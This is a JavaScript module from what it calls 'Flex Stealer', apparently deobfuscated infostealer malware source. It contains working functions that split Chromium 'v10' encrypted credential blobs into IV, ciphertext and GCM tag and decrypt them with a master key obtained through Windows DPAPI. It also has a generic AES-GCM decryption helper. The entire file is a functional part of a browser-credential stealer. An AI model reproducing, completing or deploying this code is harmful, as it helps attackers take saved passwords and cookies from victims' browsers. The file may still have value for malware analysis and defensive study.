/**
 * aes-gcm.js — Flex Stealer / Browser Utils
 *
 * AES-256-GCM decryption helpers for Chromium-based browser credential blobs.
 *
 * Chromium stores encrypted values in a binary blob with the following layout:
 *
 *   [ "v10" (3 bytes) ][ IV (12 bytes) ][ ciphertext (n bytes) ][ GCM authTag (16 bytes) ]
 *
 * The master key is a 32-byte AES-256 key decrypted from Local State via Windows DPAPI
 * (see dpapi.js → extractDpapiKey / decryptWithPowershell).
 *
 * Dependencies:
 *   crypto        — Node.js built-in
 *   ./helpers     — AES_GCM_IV_SIZE constant (= 12)
 *
 * Exports:
 *   decryptChromiumValue(blob, masterKey)  — decrypts a full Chromium "v10" blob
 *   decryptAesGcm(ivPrependedData, key)   — raw AES-GCM, data prefixed with 12-byte IV
 */

'use strict';

const crypto = require('crypto');
const { AES_GCM_IV_SIZE } = require('./helpers');  // = 12

// ---------------------------------------------------------------------------
// Constants (resolved from the obfuscated constant pool)
// ---------------------------------------------------------------------------

/** Byte length of the "v10" prefix Chromium uses to mark AES-GCM encrypted blobs. */
const CHROMIUM_V10_PREFIX_LENGTH = 3;

/** Byte length of the GCM authentication tag appended at the end of every ciphertext. */
const GCM_AUTH_TAG_LENGTH = 16;

/** Minimum blob size that makes sense: prefix + IV + at least 1 byte + authTag */
const MIN_BLOB_SIZE = CHROMIUM_V10_PREFIX_LENGTH + AES_GCM_IV_SIZE + 1 + GCM_AUTH_TAG_LENGTH;

// ---------------------------------------------------------------------------
// decryptChromiumValue
// ---------------------------------------------------------------------------

/**
 * Decrypts a Chromium-format AES-256-GCM encrypted blob.
 *
 * Blob layout:
 *   bytes 0-2:   "v10" ASCII prefix (3 bytes)
 *   bytes 3-14:  12-byte GCM IV / nonce
 *   bytes 15-N:  ciphertext  (variable length)
 *   bytes N+1-N+16: 16-byte GCM authentication tag
 *
 * @param  {Buffer} blob       The raw encrypted value from the SQLite database.
 * @param  {Buffer} masterKey  32-byte AES-256 master key decoded via DPAPI.
 * @returns {Buffer|null}      Decrypted plaintext as a Buffer, or null on failure.
 */
function decryptChromiumValue(blob, masterKey) {
    try {
        if (!blob || !masterKey) return null;
        if (blob.length < MIN_BLOB_SIZE) return null;

        const iv          = blob.slice(CHROMIUM_V10_PREFIX_LENGTH, CHROMIUM_V10_PREFIX_LENGTH + AES_GCM_IV_SIZE);
        const authTag     = blob.slice(-GCM_AUTH_TAG_LENGTH);
        const ciphertext  = blob.slice(CHROMIUM_V10_PREFIX_LENGTH + AES_GCM_IV_SIZE, -GCM_AUTH_TAG_LENGTH);

        const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
        decipher.setAuthTag(authTag);

        return Buffer.concat([decipher.update(ciphertext), decipher.final()]);
    } catch (_) {
        return null;
    }
}

// ---------------------------------------------------------------------------
// decryptAesGcm
// ---------------------------------------------------------------------------

/**
 * Raw AES-256-GCM decryption where the IV is prepended to the data blob.
 *
 * Data layout:
 *   bytes 0-11:  12-byte GCM IV / nonce
 *   bytes 12-N:  ciphertext + 16-byte GCM authentication tag (last 16 bytes)
 *
 * This is used internally for decrypting Firefox NSS blobs or other AES-GCM
 * data that does not carry the Chromium "v10" prefix.
 *
 * @param  {Buffer} ivPrependedData  IV (12 bytes) followed by ciphertext + authTag.
 * @param  {Buffer} key              32-byte AES-256 key.
 * @returns {Buffer|null}            Decrypted plaintext, or null on failure.
 */
function decryptAesGcm(ivPrependedData, key) {
    try {
        if (!ivPrependedData || !key) return null;
        if (ivPrependedData.length < AES_GCM_IV_SIZE + GCM_AUTH_TAG_LENGTH + 1) return null;

        const iv         = ivPrependedData.slice(0, AES_GCM_IV_SIZE);
        const authTag    = ivPrependedData.slice(-GCM_AUTH_TAG_LENGTH);
        const ciphertext = ivPrependedData.slice(AES_GCM_IV_SIZE, -GCM_AUTH_TAG_LENGTH);

        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(authTag);

        return Buffer.concat([decipher.update(ciphertext), decipher.final()]);
    } catch (_) {
        return null;
    }
}

// ---------------------------------------------------------------------------
// Exports
// ---------------------------------------------------------------------------

module.exports = {
    decryptChromiumValue,
    decryptAesGcm,
};